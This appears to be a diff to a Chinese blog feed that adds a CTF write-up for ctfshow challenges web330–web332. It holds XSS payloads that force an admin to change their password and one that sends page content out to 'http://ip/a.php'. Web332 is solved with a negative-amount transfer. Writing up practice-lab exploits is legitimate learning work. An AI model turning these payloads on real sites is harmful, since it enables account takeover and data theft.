@@ -763,6 +763,31 @@
 <p>群主就根据这个东西写出来了payloa</p>
 <p><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
 <p>还是拿这个当作密码，就可以了。</p>
+<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>上来先试一梭子上一题的payload，好像并没有成功。</p>
+<p>继续看这题多了个修改密码界面，那么只要让管理员修改成我们知道的密码，就能解决了</p>
+<p>x到管理员，还是得走我们的密码。先抓个包看看改密码的api</p>
+<img src="https://img-blog.csdnimg.cn/0a4879f68336444e8d986e3552783c10.png" style="zoom:67%;" />
+
+<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;</code></p>
+<p>这里的由于x的是admin，所以用了admin的本地IP<code>127.0.0.1</code></p>
+<p>注册，发现并没有什么用，试试用户名，你看那用户名，很长一筐，其实之前一直没用用户名，是因为用户名只能注册一次，但是密码可以重复</p>
+<p>或者保险起见，直接用户名密码全是xss</p>
+<p>好了，admin#123 登陆成功，为了防止自动跳转，这里抓一下</p>
+<img src="https://img-blog.csdnimg.cn/d48a5d3eb1a740959464921c655482a8.png" style="zoom:67%;" />
+
+<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>上来，先试一试上一题的payload，好吧，并没有那么幸运</p>
+<p>这里注意到url，发现并不是get了，那么猜测是post，抓包一看，果然是</p>
+<p><img src="https://img-blog.csdnimg.cn/83335aeb075740c3ad9e32239bd3c718.png"></p>
+<p>仿照，post的源码，写个payload就好了</p>
+<img src="https://img-blog.csdnimg.cn/2374b981265e47b0937e36cfe3e3422b.png" style="zoom:67%;" />
+
+<p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></p>
+<p>payload来喽，解决</p>
+<p><img src="https://img-blog.csdnimg.cn/d6eb838fe97e432dafbb2981a18f6abe.png"></p>
+<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>这题很简单，要买flag嘛，但是钱不够，还有个转账口子</p>
+<p>尝试转负的，然后就成功了</p>
+<p><img src="https://img-blog.csdnimg.cn/7f640a54e90146fbaec3670dff798fab.png"></p>
+<p>购买flag，成功</p>
 ]]></content>
       <tags>
         <tag>wp</tag>
